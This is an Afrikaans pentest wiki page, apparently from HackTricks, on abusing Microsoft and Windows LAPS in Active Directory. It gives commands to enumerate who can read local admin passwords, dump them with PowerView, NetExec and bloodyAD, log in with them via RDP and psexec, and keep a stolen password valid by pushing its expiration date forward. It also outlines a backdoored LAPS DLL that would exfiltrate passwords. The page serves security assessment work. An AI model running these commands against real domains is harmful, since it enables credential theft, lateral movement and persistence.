# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Basiese Inligting

Daar is tans **2 LAPS-geure** wat jy tydens 'n assessering kan teëkom:

- **Legacy Microsoft LAPS**: stoor die plaaslike administrateur se wagwoord in **`ms-Mcs-AdmPwd`** en die vervaltyd in **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (ingebou in Windows sedert die April 2023-opdaterings): kan steeds legacy-modus emuleer, maar in native-modus gebruik dit **`msLAPS-*`**-attribute, ondersteun **password encryption**, **password history**, en **DSRM password backup** vir domeinbeheerders.

LAPS is ontwerp om **plaaslike administrateurwagwoorde** te bestuur, sodat hulle **uniek, ewekansig en gereeld verander** word op rekenaars wat aan die domein gekoppel is. As jy daardie attribute kan lees, kan jy gewoonlik as die plaaslike admin **pivot** na die betrokke host. In baie omgewings is die interessante deel nie net om die wagwoord self te lees nie, maar ook om uit te vind **aan wie toegang tot die wagwoord-attribute gedelegeer is**.

### Legacy Microsoft LAPS-attribute

In die domein se rekenaarobjekte lei die implementering van legacy Microsoft LAPS tot die byvoeging van twee attribute:<sup>[[1]](#references)</sup>

- **`ms-Mcs-AdmPwd`**: **plain-text administrateurwagwoord**
- **`ms-Mcs-AdmPwdExpirationTime`**: **wagwoordvervaltyd**

### Windows LAPS-attribute

Native Windows LAPS voeg verskeie nuwe attribute by rekenaarobjekte:<sup>[[2]](#references)</sup>

- **`msLAPS-Password`**: plain-text wagwoordblob wat as JSON gestoor word wanneer encryption nie geaktiveer is nie
- **`msLAPS-PasswordExpirationTime`**: geskeduleerde vervaltyd
- **`msLAPS-EncryptedPassword`**: encrypted huidige wagwoord
- **`msLAPS-EncryptedPasswordHistory`**: encrypted wagwoordgeskiedenis
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: encrypted DSRM-wagwoorddata vir domeinbeheerders
- **`msLAPS-CurrentPasswordVersion`**: GUID-gebaseerde weergawenasporing wat deur nuwer rollback-detection-logika gebruik word (Windows Server 2025 forest-skema)

Wanneer **`msLAPS-Password`** leesbaar is, bevat die waarde 'n JSON-objek met die rekeningnaam, opdateringstyd en plain-text-wagwoord, byvoorbeeld:<sup>[[2]](#references)</sup>
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Kontroleer of geaktiveer
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## LAPS-wagwoordtoegang

Jy kan die **rou LAPS-beleid** vanaf `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` **aflaai** en dan **`Parse-PolFile`** van die [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser)-pakket gebruik om hierdie lêer na mensleesbare formaat om te skakel.

### Legacy Microsoft LAPS PowerShell-cmdlets

As die legacy LAPS-module geïnstalleer is, is die volgende cmdlets gewoonlik beskikbaar:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Windows LAPS PowerShell-cmdlets

Native Windows LAPS kom met 'n nuwe PowerShell-module en nuwe cmdlets:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText

# Use alternate credentials for an authorized decryptor
$cred = Get-Credential CONTOSO\LAPSDecryptor
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
```
'n Paar operasionele besonderhede is hier belangrik:<sup>[[3]](#references)</sup>

- **`Get-LapsADPassword`** hanteer outomaties **legacy LAPS**, **clear-text Windows LAPS**, en **encrypted Windows LAPS**.
- As die wagwoord encrypted is en jy dit kan **lees**, maar nie kan **decrypt** nie, gee die cmdlet metadata soos **`Source`**, **`DecryptionStatus`**, en **`AuthorizedDecryptor`** terug, selfs wanneer dit nie die clear-text wagwoord kan teruggee nie.
- In **encrypted Windows LAPS** is **read permission** en **decrypt permission** **verskillende kontroles**. Toegang om OU / objecte te lees beteken nie outomaties dat jy **`msLAPS-EncryptedPassword`** kan decrypt nie.
- **Wagwoordgeskiedenis** is slegs beskikbaar wanneer **Windows LAPS encryption** geaktiveer is.
- Op domain controllers kan die teruggekeerde source **`EncryptedDSRMPassword`** wees.

Dit is nuttig tydens 'n assessment omdat die **`AuthorizedDecryptor`**-veld aandui **vir watter gebruiker of groep die blob encrypted is**, wat 'n mislukte wagwoord-leesaksie dikwels in 'n nuwe privilege-escalation-teiken omskep.

### PowerView / LDAP

**PowerView** kan ook gebruik word om uit te vind **wie die wagwoord kan lees en dit te lees**:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
Indien **`msLAPS-Password`** leesbaar is, parse die teruggekose JSON en haal **`p`** vir die password en **`n`** vir die managed local admin account name uit.
```bash
# Extract both the password and the real managed account name
$laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
$laps.n
$laps.p
```
Daardie **`n`**-veld is belangrik in nuwer deployments omdat **Windows LAPS automatic account management** ’n **custom account** in plaas van die ingeboude **`Administrator`** kan teiken, en nuwer **Windows 11 24H2 / Windows Server 2025**-stelsels selfs daardie rekeningnaam kan **randomize**.<sup>[[4]](#references)</sup>

### Linux / remote tooling

Moderne tooling ondersteun beide legacy Microsoft LAPS en Windows LAPS.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Notas:

- Onlangse **NetExec**-builds ondersteun **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`** en **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** is steeds nuttig vir **legacy Microsoft LAPS** vanaf Linux, maar dit teiken slegs **`ms-Mcs-AdmPwd`**.
- Nuwer cross-platform tooling soos **`LAPS4LINUX`**, tooling gebaseer op **`dpapi-ng`**, en onlangse **NetExec**-workflows kan ook **native Windows LAPS** vanaf nie-Windows-hosts hanteer.
- Indien die omgewing **encrypted Windows LAPS** gebruik, is ’n eenvoudige LDAP-leesaksie nie genoeg nie; jy moet ook ’n **authorized decryptor** wees (of oor ekwivalente decryption-materiaal beskik, soos offline domain DPAPI-NG root key-materiaal).<sup>[[5]](#references)</sup>
- Op **Windows 11 24H2 / Windows Server 2025**, moenie aanvaar dat die managed local admin altyd **`Administrator`** is nie. Automatic account management kan ’n custom account skep en die naam daarvan opsioneel randomize, dus moet jy eers die account-naam via **`n`** / **`Account`** ontdek voordat jy **`--laps`** op skaal gebruik.<sup>[[4]](#references)</sup>

### Misbruik van directory synchronization

As jy domain-level **directory synchronization**-regte het in plaas van direkte lees-toegang op elke computer object, kan LAPS steeds interessant wees.

Die kombinasie van **`DS-Replication-Get-Changes`** met **`DS-Replication-Get-Changes-In-Filtered-Set`** of **`DS-Replication-Get-Changes-All`** kan gebruik word om **confidential / RODC-filtered** attributes soos legacy **`ms-Mcs-AdmPwd`** te synchronize. BloodHound modelleer dit as **`SyncLAPSPassword`**. Sien [DCSync](dcsync.md) vir die agtergrond oor replication-rights.

## LAPSToolkit

Die [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) vergemaklik die enumeration van LAPS met verskeie functions.<sup>[[6]](#references)</sup>\
Een daarvan is om **`ExtendedRights`** te parse vir **alle computers met LAPS enabled.** Dit wys **groups** wat spesifiek **gedelegeer is om LAPS passwords te lees**, en wat dikwels users in protected groups is.\
’n **Account** wat ’n **computer** aan ’n domain **joined** het, ontvang `All Extended Rights` oor daardie host, en hierdie reg gee die **account** die vermoë om **passwords te lees**. Enumeration kan ’n user account wys wat die LAPS-password op ’n host kan lees. Dit kan ons help om **spesifieke AD-users te target** wat LAPS-passwords kan lees.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## Dumping van LAPS-wagwoorde met NetExec / CrackMapExec

As jy nie ’n interactive PowerShell het nie, kan jy hierdie voorreg op afstand oor LDAP misbruik:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
Dit dump al die LAPS secrets wat die gebruiker kan lees, sodat jy lateraal kan beweeg met ’n ander plaaslike administrateur se password.

## Gebruik LAPS Password
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## LAPS Persistence

### Vervaldatum

Sodra jy **admin** is, is dit moontlik om die **wagwoorde te bekom** en te **verhoed** dat ’n masjien sy **wagwoord** **opdateer** deur die **vervaldatum na die toekoms te stel**.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Native Windows LAPS gebruik eerder **`msLAPS-PasswordExpirationTime`**:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> Die wagwoord sal steeds roteer indien ’n **admin** **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`** gebruik, of indien **Moenie wagwoordvervaltyd langer as deur die beleid vereis toelaat nie** geaktiveer is.

### Voorbehoud oor terugrol van snapshots op nuwer Windows LAPS

Ouer snapshot- / image-terugroltruuks is **minder betroubaar** teenoor onlangse **Windows LAPS**-ontplooiings. Op **Windows 11 24H2 / Windows Server 2025**, indien die forest-skema **`msLAPS-CurrentPasswordVersion`** insluit (**Windows Server 2025 forest-skema**), vergelyk die kliënt ’n plaaslik gekasde GUID met die waarde wat in AD gestoor word en **roteer dit onmiddellik die wagwoord** wanneer ’n terugrol ’n **inkonsekwente toestand** skep.

In die praktyk beteken dit dat snapshot-gebaseerde persistence of pogings om ’n ou, bekende plaaslike admin-wagwoord te laat herleef, vinnig kan misluk eerder as om tot die volgende normale vervaldatum te oorleef.<sup>[[2]](#references)</sup>

Hierdie beskerming is slegs van toepassing op **AD-backed Windows LAPS** en hang steeds daarvan af of die teruggerolde masjien weer teen **AD kan autentiseer**. Indien die masjien nie meer met AD kan kommunikeer nie, kan **wagwoordgeskiedenis** of **AD-backup-toegang** dalk steeds die dag red.

### Voorbehoud oor peutery met outomatiese rekeningbestuur

Wanneer **outomatiese rekeningbestuur** geaktiveer is, beheer Windows LAPS die lewensiklus van die bestuurde plaaslike admin-rekening. Onverwagte pogings om daardie rekening te hernoem, te herkonfigureer of andersins mee te peuter, kan verwerp word met **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`**, dus is persistence wat daarvan afhang om die bestuurde LAPS-rekening stilweg te wysig, minder betroubaar op nuwer endpoints.<sup>[[4]](#references)</sup>

### Herwinning van historiese wagwoorde uit AD-backups

Wanneer **Windows LAPS-enkripsie + wagwoordgeskiedenis** geaktiveer is, kan gemonteerde AD-backups ’n bykomende bron van secrets word. Indien jy toegang tot ’n gemonteerde AD-snapshot het en recovery mode kan gebruik, kan jy ouer gestoorde wagwoorde navraag doen sonder om met ’n aktiewe DC te kommunikeer.<sup>[[3]](#references)</sup>
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
Dit is meestal relevant tydens **AD backup theft**, **offline forensics abuse** of **disaster-recovery media access**.

### Backdoor

Die oorspronklike bronkode vir legacy Microsoft LAPS kan [hier](https://github.com/GreyCorbel/admpwd) gevind word; daarom is dit moontlik om 'n backdoor in die kode te plaas (byvoorbeeld binne die `Get-AdmPwdPassword`-metode in `Main/AdmPwd.PS/Main.cs`) wat op een of ander manier **nuwe wagwoorde sal exfiltrate of dit êrens sal stoor**.

Compile dan die nuwe `AdmPwd.PS.dll` en upload dit na die masjien by `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (en verander die modification time).

## Verwysings

- [1] [Introduction to Microsoft LAPS – Local Administrator Password Solution](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [2] [Windows LAPS schema and rights extensions for Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [3] [Get started with Windows LAPS and Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
- [4] [Windows LAPS account management modes](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
- [5] [LAPS 2.0 Internals - XPN Infosec Blog](https://blog.xpnsec.com/lapsv2-internals/)
- [6] [LAPSToolkit - leoloobeek](https://github.com/leoloobeek/LAPSToolkit)

{{#include ../../banners/hacktricks-training.md}}
